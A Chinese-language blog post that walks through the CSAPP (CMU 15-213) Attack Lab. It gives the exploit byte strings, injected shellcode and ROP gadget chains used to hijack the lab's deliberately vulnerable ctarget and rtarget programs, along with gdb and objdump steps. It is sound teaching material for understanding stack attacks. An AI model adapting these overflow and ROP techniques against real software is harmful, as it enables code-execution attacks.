---
title: "CSAPP 之 Attack Lab"
pubDatetime: 2022-03-15
description: 记录在阅读和学习 CSAPP 过程中，完成 AttackLab 的相关内容
tags:
  - operation system,
  - c,
  - csapp,
  - assembly,
  - attack,
  - disassembly
  - cmu15-213
ogImage: /assets/csapp-attack/attack_preview.png
comments: true
---

## Table of contents

## 0x0 Introduction

在学习完汇编和系统安全相关的内容之后，为了更好的理解相关的内容，csapp 提供了一个配套的 lab，提供了两种方式的攻击，一种是直接写入 code，让程序在 return 时执行我们传入的另外一个函数地址；另外一种方式是通过组合代码中已有的片段，让代码按照我们想要的方式运行，最终被我们接管。

通过完成 attack lab，可以更好地理解 buffer overflow 相关的内容，同时也可以真正理解 code-injection 和 return-oriented 这两种攻击方式，最终可以更好地帮助我们写出安全漏洞更小的代码
。

在完成 lab 的同时，也可以让我们对 `gdb` 以及 `objdump` 等相关工具更熟练的掌握，对 stack frame 有深入的理解。

下面我们先介绍一下完成这个 lab 之前的一些工具准备工作，之后再分别介绍两种不同的攻击方式是如何实现的。

### 0x0.1 Preparation

1. 第一个需要使用的工具是 `gcc`，需要用它来编译汇编代码，因为我们要在程序中插入自己的代码，所以需要用 `gcc` 将这段汇编代码编译，等待后续的使用；

   ```shell
   gcc -c test.s
   ```

2. 接着需要用到 `objdump`，这是用来将汇编代码转换成实际的机器码，因为需要传递给计算机执行，不能将汇编代码直接传进去，需要先通过 `gcc` + `objdump` 将汇编代码变成机器码；

   ```shell
   objdump -d test.o
   ```

3. 最后需要使用的是 lab 中提供的工具 `hex2raw`，因为程序需要的输入是字符串，但是我们工具的时候希望传入字节码，这个工具可以将我们期望传入程序的字节码转换成字符串；

   ```shell
   ./hex2raw < exploit.txt > exploit.bin
   ```

通过这三个工具我们就可以将需要执行的汇编代码转换成字节码，最终送到计算机中进行执行，这三个工具也给了我们做 code-injection 攻击的基础。

### 0x0.2 Target Programs

这个 lab 中一共有两个 program 需要进行攻击，分别是 `CTARGET` 和 `RTARGET`，它们都是从 standard input 中读入 strings，主要是利用了下面 `getbuf` 这个函数

```c
unsigned getbuf() {
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

函数 `Gets` 和 `gets` 当 `BUFFER_SIZE` 足够大或者是 string 很小的时候是没有区别的，他们的行为就是将输入的 string 复制到目标位置，比如下面的例子

当输入比较短的字符串序列时，可以获得正常的结果。

```shell
unix> ./ctarget -q
Cookie: 0x59b997fa
Type string:Keep it short!
No exploit.  Getbuf returned 0x1
Normal return
```

当输入比较长的字符串序列时，会触发 segmentation fault。

```shell
unix> ./ctarget -q
Cookie: 0x59b997fa
Type string:This is not a very interesting string, but it has the property that
Ouch!: You caused a segmentation fault!
Better luck next time
FAIL: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:FAIL:0xffffffff:ctarget:0:54 68 69 73 20 69 73 20 6E 6F 74 20 61 20 76 65 72 79 20 69 6E 74 65 72 65 73 74 69 6E 67 20 73 74 72 69 6E 67 2C 20 62 75 74 20 69 74 20 68 61 73 20 74 68 65 20 70 72 6F 70 65 72 74 79 20 74 68 61 74
```

我们的任务就是通过 `ctarget` 输入一个字符串来实现对这个程序的攻击，下面我们来具体针对每个 case 进行讲解。

## 0x1 Code Injection Attacks

对于前三个阶段，你需要把输入 string 存在 stack 中，如果 string 这包含一段可执行文件的字节编码，那么程序会将这个字符串看做可执行的代码，这样就实现了对代码的攻击。

### 0x1.1 Level 1

这个阶段是一个热身环节，不需要插入可执行的代码，只需要在程序返回的时候，重定向到另外一个存在的 procedure 中就可以了。

首先通过 `objdump -d ctarget > ctarget.s` 可以将可执行程序反编译成汇编代码，而 `getbuf` 主要在下面的 `test` 函数中进行调用

```c
void test() {
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

当 `getbuf` 执行结束之后，函数会返回到 `test` 中继续执行后面的语句，在这次攻击中，我们希望程序在执行完 `getbuf` 之后可以跳到 `touch1` 这种函数中，而不要继续在 `test` 中执行。

```c
void touch1() {
    vlevel = 1;         / * Part of validation protocol * /
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

首先可以在汇编中找到 `test` 和 `getbuf` 对应的位置代码如下

```js
0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
  401976:	89 c2                	mov    %eax,%edx
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	callq  400df0 <__printf_chk@plt>
  40198c:	48 83 c4 08          	add    $0x8,%rsp
  ...
```

```js
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

在 `getbuf` 中，程序首先将栈顶 `%rsp` 减小 0x28=40 个字节，接着通过调用 `Gets` 获得用户输入的字符串，然后再将栈顶增加 40 个字节，最后通过 `retq` 退出这个函数的执行。

通过 `gdb` 进行执行，在 `getbuf` 这个函数开始时打上断点，然后进行运行，接着通过下面的命令查看分配的 buffer 大小

```js
(gdb) x/6gx $rsp
0x5561dc78:     0x0000000000000000      0x0000000000000000
0x5561dc88:     0x0000000000000000      0x0000000000000000
0x5561dc98:     0x0000000055586000      0x0000000000401976
```

可以发现当程序执行完毕之后，增加栈顶，最终返回的地址是 `0x401976`，这正是 `test` 函数中调用 `getbuf` 之后一行的执行地址，所以我们只需要写入字符串，让字符串 overflow，将这个返回的地址变成我们希望他执行的函数 `touch1` 的地址 `0x4017c0` 即可。

所以输入的字符串如下

```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40
```

其中前面 5 行，每行 8 个字节，一共 40 个字节填充了栈中的 buffer，接着填入 `c0 17 40` 替换之前的返回地址，这里要注意填入的顺序，返回地址是 `0x4017c0`，在填入 buffer 的时候，顺序是按地址从小到大依次填入每个字符，所以应该填入 `c0 17 40`，这样从地址中拿到的数据才是 `0x4017c0`。

接着可以通过 `gdb` 验证一下输入这样的 string 后 stack 中的内存变化

```js
(gdb) x/6gx $rsp
0x5561dc78:     0x0000000000000000      0x0000000000000000
0x5561dc88:     0x0000000000000000      0x0000000000000000
0x5561dc98:     0x0000000000000000      0x00000000004017c0
```

发现确实已经生效了，最后通过下面的方式验证 level1 攻击已经成功。

```shell
./hex2raw -i ctarget.1.txt| ./ctarget -q

Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
```

通过上面的信息提示可以看到，我们已经成功的调用了 `touch1`。

#### 0x1.2 Level 2

level2 攻击需要对输入的字符串插入一小段可执行的代码，除了要求程序返回的时候跳转到 `touch2` 这个函数，还需要 `val==cookie` 这个条件满足。

```c
void touch2(unsigned val) {
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
    }
    exit(0);
}
```

如果要执行到 `touch2`，那么和 level1 类似，只需要输入字符让其 overflow 栈中的内存，覆盖掉之前的返回地址即可。另外的一个需求是要对函数 `touch2` 的第一个参数修改为 `cookie` 这个值，需要插入一段汇编代码，但是如何让插入的这段汇编代码执行呢？

原理可以用下面的这幅图来表示

<img src='/assets/csapp-attack/attack_preview.png' width='500'>

相当于在 Q stack frame 中插入一段字符串，不过不要用 `touch1` 的地址去覆盖之前的返回地址，而是用 B 的地址去覆盖，这样程序在执行完 Q 之后就会跳到 B 的地址出继续执行，而 B 地址出的内存是我们通过 string 传入的内容，这样我们就可以传入一段可以执行的命令，在执行完之后，通过 `retq` 再跳转到 `touch2` 的执行地址。

前面通过 `gdb` 查看 `getbuf` 中的内存，发现栈顶的地址是 `0x0x5561dc78`，所以我们可以把需要执行的代码段在最前面写入，然后把这个地址放到 `0x4017c0` 的位置就可以插入我们要执行的代码。

```js
(gdb) b*0x4017ac
(gdb) r -q
(gdb) x/6gx $rsp
0x5561dc78:     0x0000000000000000      0x0000000000000000
0x5561dc88:     0x0000000000000000      0x0000000000000000
0x5561dc98:     0x0000000000000000      0x00000000004017c0
```

下面来看一下我们需要执行的代码应该怎么写，这里需要就 `val` 设置成 `cookie` 的值，那么如何找到 `cookie` 的值呢？

可以运行到 `touch2` 然后打断点，简单地将 level1 中 `touch1` 的地址修改为 `touch2` 即执行到 `touch2` 中，然后通过在 gdb 中运行 `x 0x6044e4` 发现 `cookie` 的值为 `0x59b997fa`，所以只需要把 `%rdi` 设置成 `cookie` 值即可。

所以要执行的代码就是设置 `val` 的值，即为 `touch2` 函数的第一个参数，对应寄存器为 `$rdi`，接着再执行 `touch2` 函数，这里可以首先将 `touch2` 的地址压到栈里面，执行完指令之后，通过 `retq` 就可以执行这个压栈地址对应的 procedure，这种方式相对来说最简单，那么对应的代码如下

```js
pushq $0x4017ec
movq $0x59b997fa,%rdi
ret
```

将这个文件保存为 `example.s`，然后通过下面的方式，首先 assemble 这个文件，然后 disassemble 它

```shell
unix> gcc -s example.s
unix> objdump -d example.o > example.d
```

这样就可以得到 `example.d` 的文件如下

```js
Disassembly of section .text:

0000000000000000 <.text>:
   0:	68 ec 17 40 00       	pushq  $0x4017ec
   5:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   c:	c3                   	retq
```

从上面的代码中就可以看出，对应的 3 个汇编指令的字节码，比如第一个 `pushq` 的字节码就是 `68 ec 17 40 00`，最终写入的 txt 文本为

```txt
68 ec 17 40 00
48 c7 c7 fa 97 b9 59
c3
00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00
78 dc 61 55
```

中间的 `00` 是为了填充空白的内存，最后在栈顶将返回的地址替换成 `0x5561dc78`，这样就会执行写入字符串的 3 个指令，接着再执行 `touch2`。

```shell
./hex2raw -i ctarget.2.txt| ./ctarget -q

Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
```

#### 0x1.3 Level 3

`sval` 就是需要我们传入的参数，`cookie` 是需要比较的内容，可以先找到 `touch3` 函数的地址是 `0x4018fa`，先使用 `gdb`在 `touch3` 的入口打上断点，然后按照 level1 的做法，让程序在 `return` 之后跳转到 `touch3`，接着单步运行，到执行 `hexmatch` 函数之前，这个时候可以通过下面的方式访问需要的字符串以及他们对应的 16 进制数字

```javascript
(gdb) x/s 0x6044e4
0x6044e4 <cookie>:      "\372\227\271Y"
(gdb) p/x "\372\227\271Y"
$3 = {0xfa, 0x97, 0xb9, 0x59, 0x0}
```

接着再将这里的 16 进制数字转换成 `anscii` 码，比如 `f` 对应 `0x66`，以此转换即可得到需要写入的 16 进制数字。

在获得了需要输入的字符串之后，我们可以仿照 level2 进行数据的插入，不过需要思考一个问题，那就是在调用 `hexmatch` 这个函数的时候，会有压栈的操作，如果保存的数据在栈里面，有可能会被覆盖。

我们可以查看 `hexmatch` 的代码，发现在压栈的时候，有下面这行代码

```javascript
401850:	48 83 c4 80   add    $0xffffffffffffff80,%rsp
```

将上面的立即数翻译成一个有符号的正数，结果就是 `-128`，所以栈顶会减小 128 个字节，如果将数据放在这里，会出现覆盖的风险，应该将字符串放在 `$rsp` 最大的位置。

可以通过打断点，在 `getbuf` 的 `retq` 停下来，然后通过 `p/x $rsp` 获得目前栈顶的地址是 `0x5561dca0`，接着会执行 `retq` 操作，这样栈顶会增加 8，这就是整个程序运行过程中的最大栈顶地址，我们可以在这里写入需要传到 `touch3` 中的字符串，那么这里的地址就是 `0x5561dca8`，所以最终我们插入的可执行代码为

```javascript
pushq $0x4018fa
movq $0x5561dca8,%rdi
retq
```

接着仿照 level2 的做法可以获得这段可执行代码的字节码如下

```javascript
0000000000000000 <.text>:
   0:	68 fa 18 40 00       	pushq  $0x4018fa
   5:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
   c:	c3                   	retq
```

所以最后我们要写入的 txt 文本为

```javascript
68 fa 18 40 00
48 c7 c7 a8 dc 61 55
c3
00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61 00
```

最顶上是可执行代码，接着中间是占位符，然后填入执行代码的地址是 `0x5561dc78`，在最后输入字符串对应的 `anscii` 码。
注意字符串从内存中读取的时候，是按地址从小到大进行读取的，但是在写入字符串的时候却是从大到小，所以这里需要颠倒一下顺序。

## 0x2 Return-Oriented Programming

有的时候采用 `code-injection` 攻击会变得非常困难，因为有两个技术可以用来防止这种攻击：

- 使用 randomization 的方式，每一次 stack position 都会不一样，所以没有办法确定插入的代码在计算机中的地址，也就无法让程序运行插入的代码。

- 标记 stack 所在的内存为不可执行的状态，在这个情况下，即使插入了攻击的代码，在运行它的时候也会遇到 segmentation fault。

那么是不是在这种情况下我们就无法对程序进行攻击了呢？

聪明的程序员发现可以通过执行代码中存在的片段而不是插入代码来实现攻击，最通用的方式叫做 _return-oriented programming_(ROP)，这种策略通过识别存在于程序中 `ret` 字节序列中的一个或多个指令，这些片段叫做 _gadget_.

<img src='/assets/csapp-attack/gadget.png' width='500'>

上面的图举例说明了一个 stack 是如何执行一系列的 gadgets，图中的 stack 包含了一系列 gadget 地址，每个 gadget 包含了一系列指令的字节，不过字节的最后是 `0xc3`，这个字节表示 `ret`，每次执行完一条指令之后，就可以跳到上一条指令继续执行，这样就可以形成一个序列的执行指令。

例如，下面的 C 函数可以对应生成的会变代码如下

```c
void setval_210(unsinged *p) {
    *p = 3347663060U;
}
```

```js
0000000000400f15 <setval_210>:
400f15: c7 07 d4 48 89 c7  movl  $0xc78948d4,(%rdi)
400f1b: c3                 retq
```

字节序列 `48 89 c7` 可以编码一个指令 `movq %rax, %rdi`，同时这个序列最后包含 `c3`，即 `ret` 指令。同时这个函数的开始地址是 `0x400f15`，序列从第四个字节开始，所以这就是一个 gadget，可以达到的效果是将寄存器 `%rax` 的值放到寄存器 `%rdi` 中。

### 0x2.1 Level 4

在 level4 中，只需要重复 level2 的过程，但是 level2 是通过 code-injection 进行攻击的，level4 采用 gadget 的方式，可以通过 `gdb` 发现每次运行 `$rsp` 在不同，所以不能准确地定位到插入代码的位置。

`rtarget.s` 中提供了一系列的可执行序列，可以在里面选择需要执行的 gadget 序列。

对于 level2 而言，可以构造下面的汇编代码达到目的，因为 `pop %rax` 可以先将 `$rsp` 的内容写到 `$rax` 中，然后再将其赋值到 `$rdi` 中就实现了我们需要的结果。

```js
pop %rax; 58
movq %rax, %rdi; 48 89 c7
retq; c3
```

在 `rtarget.s` 中可以找到下面两个函数，其中正好有我们需要的指令序列，第一个指令的开始位置为 `4019cc`，执行的序列为 `58 90 c3`，其中 `0x90` 表示 `nop` 指令，所以这对应于 `pop %rax` + `retq`。

而 `4019a2` 则为 `48 89 c7 c3`，这就对应 `movq %rax, %rdi` + `retq`。

```js
00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq

00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq
```

所以最后写入的 txt 文本为

```js
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00 # 执行 pop %rax 指令 + retq
fa 97 b9 59 00 00 00 00 # cookie 的值 0x59b997fa
a2 19 40 00 00 00 00 00 # 执行 movq %rax, %rdi + retq
ec 17 40 00 00 00 00 00 # 执行 touch2
```

```shell
./hex2raw -i rtarget.2.txt | ./rtarget -q

Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
```

### 0x2.2 Level 5

Level5 和 Level3 类似，不同点在于 Level3 使用自己插入的代码进行攻击，而 Level5 需要使用 gadget 的方式，这让任务变得更难了。

按照 Level3 的要求，需要传入一个字符串的指针，字符串由于有被栈覆盖的风险，所以需要放在栈顶的最大可能位置。在 Level3 里面获取字符串的地址比较容易，因为每次程序启动的地址都是一样的，这意味着每次都可以确定写入的字符串地址，但是在 Level5 中，这个方式并不可行，因为每次程序执行的地址都不一样。

那么有什么办法可以获取到字符串的地址呢？既然绝对地址不可获取，那么我们可以通过相对地址的方式来进行获取，具体来说就是通过 `getbuf` 执行完之后的地址作为基础地址，然后通过计算插入的字符串地址和这个位置的偏移量来得到最终的字符串地址。可以用下面的一个示意图来举例。

```js
movq %rsp, %rdi
popq %rsi
offset
lea  (%rdi,%rsi,1),%rdi
0x4018fa touch3 addr
"" string content
```

在 offset 上面的指令将栈帧 `%rsp` 放到 `%rdi` 中保存，这样就可以保留基础地址，然后将 offset 的值放到 `%rsi` 中，最后通过 `lea` 进行地址的计算，获得 string 的有效地址。如果可以自己插入指令去运行，非常简单就可以完成这个实验，但是问题是我们无法获取插入指令的地址，就像上面说的，每次地址都会变化，所以需要采用 gadget 的方式，即在已有代码中对片段进行选择。

通过在 _rtarget.s_ 中对代码片段进行挑选，通过组合之后可以获得下面的代码，其中 `movq %rsp, %rdi` 因为没有现成的代码片段，所以被拆分成了 `movq %rsp, %rax` 和 `movq %rax, %rdi`。

而 `popq %rsi` 则需要更多的指令进行完成，这里就不具体解释了，直接通过阅读下面的汇编代码就可以了解对应的内容。

```js
401a06   48 89 e0 c3       mov %rsp, %rax
4019c5   48 89 c7 90 c3    mov %rax, %rdi
4019cc   58 90 c3          popq %rax (72 -> %rax)
0x48(72) offset
401a20   89 c2 00 c9 c3    movl %eax, %edx
401a34   89 d1 38 c9 c3    movl %edx, %ecx
401a27   89 ce 38 c0 c3    movl %ecx, %esi
4019d6   48 8d 04 37 c3    (%rdi,%rsi,1),%rax
4019c5   48 89 c7 90 c3    movq %rax, %rdi
4018fa   touch addr
string content
```

最后来决定 _offset_ 的值，通过计算在字符串内容之前插入的 _gadget_ 和其他的内容的行数，可以算出在 10 进制下是 9\*8 = 72，在 16 进制下则为 48。

最终写入的 txt 文本为

```js
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
cc 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
20 1a 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
27 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
00
```

```shell
./hex2raw -i rtarget.3.txt | ./rtarget -q

Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
```

## 0x3 Conclusion

通过完成 attack lab，相当于自己去走一遍黑客攻击的流程，之前一直对黑客是如何攻击的并不清楚，而且也比较好奇，这个 lab 虽然简单，却通过两种攻击方式的演示详细地揭示了这个过程，而且通过自己动手做实验，更清楚了其中的流程，算是解答了之前关于黑客攻击的一些疑惑。

另外这个实验虽然是一个攻击实验，但是却给了我们一些启发，了解敌人的攻击方式之后可以更好地为防御他们做准备。同时通过这个实验，再一次巩固了汇编的内容，加深了栈帧的理解，对程序调用，压栈和退站有了更好的理解。

## 0x4 Reference

- [recitation05-attacklab.pptx (cmu.edu)](https://www.cs.cmu.edu/afs/cs/academic/class/15213-f21/www/recitations/rec05_slides.pdf)
- [attacklab.pdf (cmu.edu)](http://csapp.cs.cmu.edu/3e/attacklab.pdf)
- [《深入理解计算机系统》Attack Lab 实验解析 Yi's Blog (earthaa.github.io)](https://earthaa.github.io/2020/02/11/CSAPP-Attacklab/)
- [《深入理解计算机系统》实验 3.Attack Lab 贺巩山的博客 (hegongshan.com)](https://www.hegongshan.com/2021/06/02/csapp-3-attack-lab/)
